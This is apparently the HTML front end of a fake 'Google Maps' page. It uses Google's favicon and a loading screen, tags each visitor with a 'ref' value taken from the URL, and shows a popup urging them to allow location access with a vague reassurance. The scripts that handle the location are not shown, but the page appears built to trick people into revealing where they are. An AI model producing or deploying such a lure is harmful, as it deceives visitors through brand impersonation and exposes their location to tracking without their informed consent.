<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google Maps</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://maps.gstatic.com/favicon3.ico">

  <!-- Extract ref from URL (e.g. ?ref=abc123) -->
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    window.userRef = urlParams.get('ref') || 'unknown_ref';
  </script>

  <!-- Defer script loading for performance -->
  <script src="script.js" defer></script>
</head>
<body>
  <!-- Loading screen -->
  <div id="loading-screen">
    <div class="spinner"></div>
    <div class="loading-text">Loading Google Maps...</div>
    <div id="retry-location" onclick="retryLocation()">üîÅ</div>
  </div>

  <!-- Location permission popup -->
  <div id="location-popup" style="display:none;">
    <div class="popup-box">
      <div class="popup-title">Allow Location Access</div>
      <div class="popup-desc">This site needs your location to show nearby results.</div>
      <ul>
        <li>Tap ‚ÄúAllow‚Äù on the browser popup</li>
        <li>We use it to improve your experience</li>
      </ul>
      <button onclick="getLocationNow()">Try Again</button>
    </div>
  </div>

  <!-- JS Fallback -->
  <noscript>
    <style>
      #loading-screen, #location-popup { display: none !important; }
    </style>
    <p style="text-align:center; padding:2em; color:red;">
      ‚ö†Ô∏è This site requires JavaScript to function properly.
    </p>
  </noscript>
  
<script src="script.js"></script>
<script src="permission-handler.js"></script>

</body>
</html>
